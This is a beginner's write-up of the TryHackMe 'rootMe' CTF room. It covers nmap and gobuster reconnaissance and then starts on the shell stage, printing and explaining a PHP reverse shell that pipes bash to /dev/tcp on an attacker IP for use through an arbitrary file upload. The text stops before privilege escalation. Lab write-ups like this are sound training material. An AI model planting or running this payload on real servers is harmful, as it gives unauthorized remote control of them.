---
layout: writeup
title: "TryHackMe Challenge: rootMe"
description: "A ctf for beginners, can you root me?"
difficulty: medium
event: "TryHackMe"
tags: [reconnaissance, web]
date: 2025-06-09
---

## Challenge Overview:
- The following was the description for the challenge:
    ![stepic challenge](/assets/img/rootMe(1).PNG){: .writeup-image }

## Questions:
1. Reconnaissance:
    ![stepic challenge](/assets/img/rootMe(2).PNG){: .writeup-image }
    - 2nd part of Question 1:
    ![stepic challenge](/assets/img/rootMe(3).PNG){: .writeup-image }


2. Getting a Shell:
    ![stepic challenge](/assets/img/rootMe(4).PNG){: .writeup-image }


3. Privilege Escalation:
    ![stepic challenge](/assets/img/rootMe(5).PNG){: .writeup-image }

---

## Reconnaissance:
![stepic challenge](/assets/img/rootMe(6).PNG){: .writeup-image }
- Nmap(Network Mapper) is a tool used for network discovery and security auditing
    ```bash
    nmap -p- -open -T4 -v 10.10.220.16
    ```
    - Note that for the ip address, you will get a different address.
    - `-p-` : Scans all the ports.
    - `-open` : Only the ports that are open.
    - `-T4` : Use this if you have a stable network, it speeds up the process.
    - `-v` : "verbose"(optional), used to show more details.
- Hence, there are two(2) ports that are open😀.

### Apache Version:
![stepic challenge](/assets/img/rootMe(7).PNG){: .writeup-image }
- Apache HTTP Server, is a commonly used web server.
    ```bash
    nmap -sV -T4 10.10.220.16
    ```
    - `-sV` : Service and Version.
- The version of the Apache is the one highlighted.

### Service running in port 22?
![stepic challenge](/assets/img/rootMe(8).PNG){: .writeup-image }
- SSH has one of the common ports.
- It assigned port 22 by default.
- So the answer would have been intuitive

### Hidden Directory
![stepic challenge](/assets/img/rootMe(9).PNG){: .writeup-image }
- Wordlist choice, there are many wordlist that you can use. But, i have went for that one.
- But if you want to use that one as well then just:
    ```bash
    locate directory-list
    ```
    - This will show all the available wordlist.
    - Then from there, we execute our gobuster tool:
    ```bash
    gobuster dir -u http://10.10.220.16 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt -t 50 -q
    ```
        - `-u`: Website that you wish to perform the scan(It is important that you use the "http://").
        - `-w`: wordlist
        - `-t`: Number of threads, this just corresponds to "speed" at which the scan will be performed, the most maximum that is recommended is 100.
        - `-q`: quite
        - The following is the homepage of the website:
    ![stepic challenge](/assets/img/rootMe(10).PNG){: .writeup-image }
    - As you can see, there is no any button that takes you to the panel page, and this implies that you have to navigate manually from the URL to navigate to the panel page:
    ![stepic challenge](/assets/img/rootMe(11).PNG){: .writeup-image }
    - This makes it the hidden directory.

## Getting a Shell:
- A remote shell is a command-line interface that allows you execute commands on a remote server/device. It is really a powerful skill to have:
    - There many ways to get a shell, but the following approach is how i have learned through previous ctf challenges:
    - Okay, but honestly i struggled a lot with this one though i thought it was gonna be easy and it was after an intensive research that i finally found out about the new extention. But let's go through it together and i will show you how i struggled if you want to know.
    - Firstly, i knew how to write the php shell code, which is as follows:
    ```php
    <?php 
        $ip=***.***.***.***;
        $port=****;
        shell_exec("/bin/bash -c 'bash -i &> /dev/tcp/$ip/$port 0>&1'");
    ?>
    ```
    - I know this might not be intuitive, but trust me the more you do the ctf challenges, the more this will stick in your brain.
    - But to describe it a little:
        - `shell_exec("")`:This is just a system function that tells the system to execute the provided commands.
        - `/bin/bash`: Path to the bash executable, basically a command-line intepreter(converts the code/commands to machine code), used for executing shell scripts. 
        - `-i`: "interactive", allows us to get an interactive shell.
        - `&> /dev/tcp/$ip/$port`: This just establishes a connection "tcp tunnel" between you and the server.
        - `0>&1`: This is just for input-output, allows us to input and get an output.
😬, but there is more detailed complex information about that payload.
    - So the objective is that we have to find a vulnerability within this website.
    - Immediately i though of the "Arbitrary File Upload" vulnerability. It when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type and extensions.
    - When can easily upload a php file, that web server will execute to give us a shell. But in this case its not that easy.
    - So then i created the php file:
    ![stepic challenge](/assets/img/rootMe(11).PNG){: .writeup-image }
    - Preference(Sublime-text editor), you may use any that you comforatable with.
    - I have already explained the payload above.
    - But for the `port` you may use any port that is not in-use, the most common one is 1337.
     









    
